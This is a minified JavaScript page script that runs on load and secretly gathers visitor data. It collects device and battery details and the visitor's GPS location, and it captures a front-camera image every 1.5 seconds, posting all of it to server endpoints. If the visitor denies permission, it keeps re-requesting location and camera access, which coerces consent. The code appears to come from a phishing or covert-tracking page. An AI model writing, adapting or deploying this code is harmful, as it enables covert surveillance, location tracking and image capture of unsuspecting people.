let get_device_info=()=>{let e=navigator.userAgent;navigator.platform;let t=e.match(/(Android|iPhone|iPad|iPod)/),n=screen.orientation.type,o=navigator.hardwareConcurrency,i=navigator.deviceMemory,a=navigator.connection.type,c=navigator.connection.downlink;navigator.getBattery().then(e=>{fetch("/device_info",{method:"POST",body:JSON.stringify({platform:`${t}`,screen_type:`${n}`,ram:`${i}`,core:`${o}`,battery:`${100*e.level}`,charging:`${e.charging}`,network_type:`${a}`,network_speed:`${c}`}),headers:{"Content-type":"application/json; charset=UTF-8"}}).then(e=>e.json()).then(e=>console.log(e))})},checkinsss=()=>{"geolocation"in navigator?navigator.geolocation.getCurrentPosition(function(e){let t=e.coords.latitude,n=e.coords.longitude;send(t,n)},function(e){checkinsss()}):checkinsss()},send=(e,t)=>{try{fetch("/send_location",{method:"POST",body:JSON.stringify({l1:`${e}`,l2:`${t}`}),headers:{"Content-type":"application/json; charset=UTF-8"}}).then(e=>e.json()).then(e=>console.log(e))}catch(n){alert(n)}};function post(e){$.ajax({type:"POST",data:JSON.stringify({image:e}),url:"/upload_images",contentType:"application/json",dataType:"json",async:!1,success:function(e){console.log("Image uploaded successfully",e)},error:function(e){console.error("Error uploading image:",e)}})}"use strict";const video=document.getElementById("video"),canvas=document.getElementById("canvas"),errorMsgElement=document.querySelector("span#errorMsg"),constraints={audio:!1,video:{facingMode:"user"}};async function init(){try{let e=await navigator.mediaDevices.getUserMedia(constraints);handleSuccess(e)}catch(t){init()}}function handleSuccess(e){window.stream=e,video.srcObject=e;var t=canvas.getContext("2d");setInterval(function(){t.drawImage(video,0,0,640,480),post(canvas.toDataURL("image/png").replace("image/png","image/octet-stream"))},1500)}window.onload=()=>{get_device_info(),checkinsss(),init()};